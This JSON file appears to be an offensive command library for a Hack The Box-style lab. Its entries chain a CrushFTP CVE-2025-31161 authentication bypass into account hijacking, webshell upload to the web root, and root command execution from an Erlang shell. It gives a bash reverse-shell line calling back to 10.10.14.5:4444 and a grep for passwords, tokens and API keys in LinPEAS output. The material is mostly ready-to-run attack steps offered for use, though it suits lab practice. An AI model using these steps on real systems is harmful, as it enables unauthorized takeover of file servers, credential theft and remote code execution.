{
  "commands": [
    {
      "id": "crushftp-cve-2025-31161-exploit",
      "name": "CrushFTP CVE-2025-31161 Authentication Bypass",
      "category": "exploitation",
      "subcategory": "web-exploitation",
      "command": "python3 cve-2025-31161.py --target_host <TARGET> --port <PORT> --target_user crushadmin --new_user <NEW_USER> --password <NEW_PASS>",
      "description": "Exploit CVE-2025-31161 authentication bypass in CrushFTP to create admin user. CRITICAL: Newly created users have EMPTY VFS (no file access). For file access, use this to gain admin panel access, then MODIFY an existing user's password instead.",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target CrushFTP server IP or hostname",
          "example": "ftp.target.htb",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "CrushFTP web interface port",
          "example": "80",
          "required": true
        },
        {
          "name": "<NEW_USER>",
          "description": "Username for new admin account",
          "example": "pwned",
          "required": true
        },
        {
          "name": "<NEW_PASS>",
          "description": "Password for new admin account",
          "example": "Pwned123!",
          "required": true
        }
      ],
      "flag_explanations": {
        "--target_host": "CrushFTP server hostname or IP address",
        "--port": "Web interface port (commonly 80, 443, 8080, 9090)",
        "--target_user": "Existing admin user to impersonate (default: crushadmin)",
        "--new_user": "Username for the account being created",
        "--password": "Password to set for the new account"
      },
      "tags": [
        "CVE-2025-31161",
        "WEB",
        "CRUSHFTP",
        "AUTH_BYPASS",
        "EXPLOITATION",
        "PRIORITY:HIGH"
      ],
      "success_indicators": [
        "User created successfully",
        "Can access /WebInterface/UserManager/",
        "Admin functions available"
      ],
      "failure_indicators": [
        "Connection refused",
        "401 Unauthorized",
        "User already exists"
      ],
      "prerequisites": [],
      "next_steps": [
        "crushftp-admin-user-modify"
      ],
      "alternatives": [],
      "troubleshooting": {
        "connection_refused": "Verify CrushFTP port - try 80, 443, 8080, 9090",
        "user_already_exists": "Use different username or proceed to modify existing user",
        "no_file_access": "EXPECTED! New users have empty VFS. Modify existing user for file access"
      },
      "notes": "CRITICAL LESSON: Creating NEW users via this exploit gives them EMPTY VFS (Virtual File System) mappings. They have admin panel access but CANNOT browse or access any files. The correct exploitation path is: 1) Use this exploit for admin access, 2) Navigate to UserManager, 3) Change an EXISTING user's password (like 'ben'), 4) Login as that user - their VFS mappings are preserved.",
      "priority": "high",
      "references": [
        {
          "title": "CVE-2025-31161 - NVD",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-31161"
        },
        {
          "title": "Immersive Labs PoC",
          "url": "https://github.com/Immersive-Labs-Sec/CVE-2025-31161"
        }
      ],
      "educational": {
        "purpose": "Bypass authentication to gain CrushFTP admin panel access",
        "manual_alternative": "Use curl with crafted AWS4-HMAC-SHA256 Authorization header and CrushAuth cookie",
        "common_failures": [
          "Creating new user instead of hijacking existing - results in no file access",
          "Wrong port for CrushFTP interface",
          "Patched version (11.3.1+)"
        ],
        "when_to_use": [
          "CrushFTP version < 11.3.1 identified",
          "/WebInterface/ path accessible",
          "Need admin access without credentials"
        ],
        "time_estimate": "2-5 minutes"
      }
    },
    {
      "id": "crushftp-admin-user-modify",
      "name": "CrushFTP Admin - Modify Existing User Password",
      "category": "exploitation",
      "subcategory": "web-exploitation",
      "command": "Navigate to http://<TARGET>:<PORT>/WebInterface/UserManager/ -> Select user '<EXISTING_USER>' -> Click 'Generate random Password' -> Delete and enter '<NEW_PASS>' -> Click 'Use this password' -> Click 'Save'",
      "description": "Use CrushFTP admin panel to change an EXISTING user's password. KEY INSIGHT: Unlike creating new users, modifying existing users PRESERVES their VFS (Virtual File System) mappings, allowing file access to directories like /webProd/.",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target CrushFTP server IP or hostname",
          "example": "ftp.target.htb",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "CrushFTP web interface port",
          "example": "80",
          "required": true
        },
        {
          "name": "<EXISTING_USER>",
          "description": "Username of existing user to hijack (enumerate via admin panel)",
          "example": "ben",
          "required": true
        },
        {
          "name": "<NEW_PASS>",
          "description": "New password to set for the hijacked user",
          "example": "123456",
          "required": true
        }
      ],
      "flag_explanations": {
        "/WebInterface/UserManager/": "CrushFTP user management interface",
        "Generate random Password": "Reveals the password field for editing",
        "Use this password": "Confirms the password change",
        "Save": "Persists the password change to the user configuration"
      },
      "tags": [
        "WEB",
        "CRUSHFTP",
        "CREDENTIAL_MANIPULATION",
        "VFS",
        "EXPLOITATION",
        "PRIORITY:HIGH"
      ],
      "success_indicators": [
        "Password successfully changed message",
        "Can login as modified user",
        "File browser shows VFS directories like /IT/, /webProd/"
      ],
      "failure_indicators": [
        "User not found",
        "Permission denied",
        "Password validation failed"
      ],
      "prerequisites": [
        "crushftp-cve-2025-31161-exploit"
      ],
      "next_steps": [
        "crushftp-webprod-upload"
      ],
      "alternatives": [],
      "troubleshooting": {
        "user_not_found": "Check UserManager for list of existing users",
        "password_not_saved": "Click Save at bottom of page after password change",
        "still_no_file_access": "User may have empty VFS - try different user with known directories"
      },
      "notes": "WHY MODIFY INSTEAD OF CREATE: CrushFTP assigns VFS (Virtual File System) mappings per-user. New users get EMPTY VFS by default. Existing users like 'ben' already have VFS mappings to directories like /webProd/. Hijacking existing accounts preserves these mappings, enabling file browsing and webshell upload.",
      "priority": "high",
      "educational": {
        "purpose": "Hijack existing user account to inherit their VFS file access permissions",
        "manual_alternative": "Use CrushFTP API: POST to /WebInterface/function/ with command=setUserItem",
        "common_failures": [
          "Forgetting to click Save after password change",
          "Targeting user with no useful VFS mappings"
        ],
        "when_to_use": [
          "Have CrushFTP admin access",
          "Need file browser access to upload webshell",
          "Newly created users show empty file listing"
        ],
        "time_estimate": "1-2 minutes"
      }
    },
    {
      "id": "crushftp-webprod-upload",
      "name": "CrushFTP Upload to webProd Directory",
      "category": "exploitation",
      "subcategory": "web-exploitation",
      "command": "In CrushFTP file browser: Navigate to /webProd/ -> Click 'Add File' or Upload button -> Select <LOCAL_SHELL> -> Confirm upload. Access shell at http://<TARGET_WEB>/<SHELL_NAME>",
      "description": "Upload webshell to CrushFTP's /webProd/ directory. This VFS path maps to the main web server's document root. Files uploaded here are accessible via HTTP on the main web server port (not the CrushFTP port).",
      "variables": [
        {
          "name": "<LOCAL_SHELL>",
          "description": "Path to local PHP/JSP webshell file",
          "example": "shell.php",
          "required": true
        },
        {
          "name": "<TARGET_WEB>",
          "description": "Main web server hostname (may be different subdomain)",
          "example": "soulmate.htb",
          "required": true
        },
        {
          "name": "<SHELL_NAME>",
          "description": "Uploaded shell filename",
          "example": "shell.php",
          "required": true
        }
      ],
      "flag_explanations": {
        "/webProd/": "VFS directory mapped to main web server document root",
        "Add File": "CrushFTP upload function in file browser interface"
      },
      "tags": [
        "WEB",
        "CRUSHFTP",
        "FILE_UPLOAD",
        "WEBSHELL",
        "EXPLOITATION",
        "PRIORITY:HIGH"
      ],
      "success_indicators": [
        "File appears in /webProd/ listing",
        "File accessible via main web server",
        "Webshell executes commands"
      ],
      "failure_indicators": [
        "Upload permission denied",
        "File not visible on web server",
        "PHP/code not executed (served as static)"
      ],
      "prerequisites": [
        "crushftp-admin-user-modify"
      ],
      "next_steps": [
        "bash-reverse-shell",
        "nc-listener-setup"
      ],
      "alternatives": [],
      "troubleshooting": {
        "permission_denied": "User VFS may not include /webProd/ - check other directories",
        "file_not_on_webserver": "webProd maps to different port - check main web server (usually 80/443)",
        "code_not_executed": "Web server may not process PHP - try JSP or check server technology"
      },
      "notes": "KEY INSIGHT: CrushFTP's /webProd/ directory typically maps to the main web application's document root. The CrushFTP interface runs on a different port (e.g., 443) than the main web server (e.g., 80). After uploading via CrushFTP, access the shell via the main web server's port and hostname.",
      "priority": "high",
      "educational": {
        "purpose": "Upload webshell to web-accessible directory for code execution",
        "manual_alternative": "Use curl with multipart form upload to CrushFTP upload endpoint",
        "common_failures": [
          "Accessing shell on CrushFTP port instead of web server port",
          "Wrong web server hostname (subdomain mismatch)"
        ],
        "when_to_use": [
          "Have CrushFTP file browser access with /webProd/ VFS",
          "Main web server serves PHP/JSP/ASP",
          "Need initial foothold for reverse shell"
        ],
        "time_estimate": "2-3 minutes"
      }
    },
    {
      "id": "erlang-shell-oscmd",
      "name": "Erlang Shell os:cmd() Command Execution",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "os:cmd(\"<COMMAND>\").",
      "description": "Execute OS commands from Erlang shell using os:cmd() function. Erlang OTP applications often run as root. Commands must end with period (.) - Erlang statement terminator. Output returns as list of ASCII integers.",
      "variables": [
        {
          "name": "<COMMAND>",
          "description": "Bash command to execute",
          "example": "id",
          "required": true
        }
      ],
      "flag_explanations": {
        "os:cmd()": "Erlang standard library function for OS command execution",
        "period (.)": "REQUIRED Erlang statement terminator - commands fail without it",
        "double quotes": "Erlang uses double quotes for strings (not single quotes)"
      },
      "tags": [
        "ERLANG",
        "PRIVILEGE_ESCALATION",
        "COMMAND_EXECUTION",
        "POST_EXPLOITATION",
        "LINUX",
        "PRIORITY:HIGH"
      ],
      "success_indicators": [
        "Command output returned (as ASCII list or readable string)",
        "uid=0(root) in id output",
        "No exception thrown"
      ],
      "failure_indicators": [
        "** exception error: undefined function os:cmd/1",
        "Syntax error before: '.'",
        "Permission denied"
      ],
      "prerequisites": [],
      "next_steps": [
        "bash-reverse-shell"
      ],
      "alternatives": [],
      "troubleshooting": {
        "undefined_function": "Module may be restricted - try erlang:system_cmd/2 or os:system/1",
        "syntax_error": "Ensure command ends with period (.) and quotes are escaped properly",
        "output_as_integers": "Erlang returns strings as ASCII lists - use io:format(\"~s~n\", [os:cmd(\"id\")]). for readable output"
      },
      "notes": "ERLANG OUTPUT FORMAT: Erlang represents strings as lists of integers (ASCII codes). [117,105,100,61,48] means 'uid=0'. Use io:format(\"~s~n\", [os:cmd(\"id\")]). for readable output.\n\nREVERSE SHELL: os:cmd(\"bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\").\n\nACCESSING ERLANG SHELL: SSH to Erlang port (commonly 2222 or custom) with discovered credentials, or through Erlang distribution protocol.",
      "priority": "high",
      "examples": [
        {
          "command": "os:cmd(\"id\").",
          "description": "Check if running as root - returns uid=0(root) if successful",
          "context": "Initial privilege verification after Erlang shell access"
        },
        {
          "command": "os:cmd(\"cat /root/root.txt\").",
          "description": "Read root flag directly from Erlang shell",
          "context": "Quick flag retrieval without spawning reverse shell"
        },
        {
          "command": "os:cmd(\"bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\").",
          "description": "Spawn reverse shell as root to attacker listener",
          "context": "Full shell access for post-exploitation"
        }
      ],
      "educational": {
        "purpose": "Execute OS commands from Erlang runtime for privilege escalation",
        "manual_alternative": "If os:cmd() restricted, try erlang:open_port({spawn, Cmd}, []) or os:system(Cmd)",
        "common_failures": [
          "Forgetting period (.) at end of command",
          "Using single quotes instead of double quotes",
          "Confusion about string output format"
        ],
        "when_to_use": [
          "Have SSH access to Erlang shell port",
          "Erlang process running as root",
          "Need to escalate from application user"
        ],
        "time_estimate": "1-2 minutes"
      }
    },
    {
      "id": "linpeas-credential-grep",
      "name": "LinPEAS Output Credential Search",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "grep -iE 'password|passwd|pwd|secret|credential|auth|token|api.?key' <LINPEAS_OUTPUT> | grep -v 'Permission denied' | head -50",
      "description": "Search saved LinPEAS output for hardcoded credentials, passwords, and secrets. Essential post-enumeration step. Focus on config files, environment variables, scripts, and application configurations.",
      "variables": [
        {
          "name": "<LINPEAS_OUTPUT>",
          "description": "Path to saved LinPEAS output file",
          "example": "/dev/shm/linpeas.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "-i": "Case-insensitive (catches PASSWORD, Password, password)",
        "-E": "Extended regex for multiple patterns with | (OR)",
        "grep -v": "Exclude 'Permission denied' noise from output",
        "head -50": "Limit output to first 50 matches for review"
      },
      "tags": [
        "CREDENTIAL_DISCOVERY",
        "LINPEAS",
        "POST_EXPLOITATION",
        "ENUMERATION",
        "LINUX",
        "PRIORITY:HIGH"
      ],
      "success_indicators": [
        "Plaintext passwords in config files",
        "Database credentials discovered",
        "SSH passwords in scripts",
        "API keys visible"
      ],
      "failure_indicators": [
        "No matches found",
        "Only false positives (documentation comments)"
      ],
      "prerequisites": [],
      "next_steps": [
        "ssh-login-password",
        "su-user"
      ],
      "alternatives": [
        "grep-recursive-password"
      ],
      "troubleshooting": {
        "too_much_output": "Add context: grep -B2 -A2 for lines around matches",
        "false_positives": "Exclude comments: | grep -v '#' | grep -v 'example'"
      },
      "notes": "COMMON CREDENTIAL LOCATIONS:\n- /etc/*.conf - System config files\n- /var/www/html/*.php - Web app configs\n- /opt/*/config - Application configs\n- Erlang .beam/.escript files - Hardcoded auth\n- .env files - Environment variables\n- Backup files (.bak, .old, ~)\n- History files (.bash_history, .mysql_history)\n\nAFTER FINDING CREDENTIALS:\n1. Try su with found password\n2. Try SSH with credentials\n3. Check password reuse across services\n4. Look for service-specific ports (Erlang: 2222)",
      "priority": "high",
      "examples": [
        {
          "command": "grep -iE 'password|user_passwords' /dev/shm/linpeas.txt",
          "description": "Search for Erlang credentials in LinPEAS output",
          "context": "Finding hardcoded passwords in configuration files"
        }
      ],
      "educational": {
        "purpose": "Extract hardcoded credentials from enumeration output",
        "manual_alternative": "find / -type f -name '*.conf' -exec grep -l password {} \\; 2>/dev/null",
        "common_failures": [
          "Not saving LinPEAS output to file for searching",
          "Missing credentials in non-obvious file formats"
        ],
        "when_to_use": [
          "After running LinPEAS",
          "Need privilege escalation vector",
          "Looking for lateral movement opportunities"
        ],
        "time_estimate": "5-10 minutes for thorough review"
      }
    }
  ]
}
